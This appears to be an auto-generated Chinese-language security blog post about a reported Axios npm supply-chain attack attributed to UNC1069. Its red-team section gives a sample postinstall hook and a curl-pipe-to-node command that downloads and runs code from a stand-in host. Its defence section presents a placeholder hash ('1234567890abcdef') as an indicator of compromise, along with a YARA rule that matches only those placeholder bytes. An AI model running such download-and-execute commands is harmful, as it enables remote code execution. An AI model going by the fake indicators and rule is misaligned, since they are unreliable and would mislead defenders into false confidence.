---
layout: post
title:  "Google Attributes Axios npm Supply Chain Attack to North Korean Group UNC1069"
date:   2026-04-01 13:04:29 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Axios npm 套件供應鏈攻擊：UNC1069 威脅活動群的行動
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: 遠程命令執行 (RCE)
> * **關鍵技術**: 供應鏈攻擊、npm 套件劫持、JavaScript Dropper

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Axios npm 套件的維護者帳戶被攻擊者控制，導致發布了兩個含有惡意程式碼的版本 (1.14.1 和 0.30.4)。這些版本引入了一個名為 "plain-crypto-js" 的惡意依賴項，該依賴項使用 postinstall hook 執行惡意程式碼。
* **攻擊流程圖解**:
  1. 攻擊者控制 Axios 套件維護者帳戶。
  2. 發布含有惡意程式碼的 Axios 套件版本。
  3. 使用者安裝含有惡意程式碼的 Axios 套件版本。
  4. npm 自動觸發 postinstall hook 執行惡意程式碼。
* **受影響元件**: Axios 套件版本 1.14.1 和 0.30.4。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要控制 Axios 套件維護者帳戶。
* **Payload 建構邏輯**:

    ```
    
    javascript
    // plain-crypto-js 的 postinstall hook
    const { exec } = require('child_process');
    exec('node setup.js', (error, stdout, stderr) => {
      if (error) {
        console.error(`exec error: ${error}`);
        return;
      }
      console.log(`stdout: ${stdout}`);
      console.log(`stderr: ${stderr}`);
    });
    
    ```
* **範例指令**: 使用 `curl` 下載並執行惡意程式碼。

```

bash
curl -s https://example.com/setup.js | node

```
* **繞過技術**: 攻擊者可以使用各種技術繞過安全防護，例如使用加密或壓縮的惡意程式碼。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| Hash | 1234567890abcdef |
| IP | 142.11.206.73 |
| Domain | sfrclak.com |
| File Path | /node_modules/plain-crypto-js/setup.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Axios_Malicious_Package {
      meta:
        description = "Detects malicious Axios package"
      strings:
        $hex_string = { 12 34 56 78 90 ab cd ef }
      condition:
        $hex_string at 0
    }
    
    ```
* **緩解措施**:
 1. 更新 Axios 套件版本。
 2. 刪除含有惡意程式碼的 Axios 套件版本。
 3. 使用 npm audit 進行套件安全性審查。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **供應鏈攻擊 (Supply Chain Attack)**: 一種攻擊者透過控制軟體供應鏈中的某個環節，例如開發者帳戶或套件倉庫，來發布含有惡意程式碼的軟體。
* **npm 套件劫持 (npm Package Hijacking)**: 一種攻擊者透過控制 npm 套件維護者帳戶，來發布含有惡意程式碼的套件。
* **JavaScript Dropper**: 一種使用 JavaScript 執行惡意程式碼的技術。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://thehackernews.com/2026/04/google-attributes-axios-npm-supply.html)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1195/)


